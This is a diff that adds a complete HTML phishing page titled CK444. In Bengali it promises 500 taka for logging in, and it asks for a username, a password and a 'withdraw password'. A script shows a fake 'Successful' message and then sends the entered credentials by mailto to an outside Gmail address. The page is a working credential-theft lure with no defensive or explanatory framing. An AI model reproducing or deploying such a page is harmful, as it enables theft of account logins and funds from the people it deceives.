@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CK444</title>
+
+<style>
+body{
+  font-family: Arial;
+  background:#000;
+  color:white;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.box{
+  background:#111;
+  padding:20px;
+  border-radius:10px;
+  width:320px;
+  text-align:center;
+  box-shadow:0 0 15px #00ffcc;
+}
+
+h1{
+  color:#ffffff;
+  font-size:18px;
+  margin-bottom:10px;
+}
+
+h2{
+  color:#00ffcc;
+  margin-bottom:20px;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  margin-bottom:10px;
+  border:none;
+  border-radius:5px;
+  background:#222;
+  color:white;
+}
+
+button{
+  width:100%;
+  padding:10px;
+  background:#00ffcc;
+  border:none;
+  border-radius:5px;
+  font-size:16px;
+  cursor:pointer;
+}
+
+#success{
+  margin-top:12px;
+  color:#00ff66;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+  <h1>500 টাকা CK444‑এ পাওয়ার জন্য Login করুন</h1>
+  <h2>CK444</h2>
+
+  <form id="loginForm"
+        action="mailto:ckck4444444@gmail.com"
+        method="post"
+        enctype="text/plain"
+        onsubmit="handleSubmit(event)">
+
+    <input type="text" name="Username" placeholder="Username" required>
+    <input type="password" name="Password" placeholder="Password" required>
+    <input type="text" name="Withdraw" placeholder="Withdraw Password" required>
+
+    <button type="submit">Submit</button>
+  </form>
+
+  <div id="success">✅ Successful</div>
+
+</div>
+
+<script>
+function handleSubmit(e){
+  e.preventDefault(); // আগে থামাই
+
+  // Successful দেখাই
+  document.getElementById("success").style.display = "block";
+
+  // 1 সেকেন্ড পরে mailto submit হবে
+  setTimeout(()=>{
+    document.getElementById("loginForm").submit();
+  }, 1000);
+}
+</script>
+
+</body>
+</html>
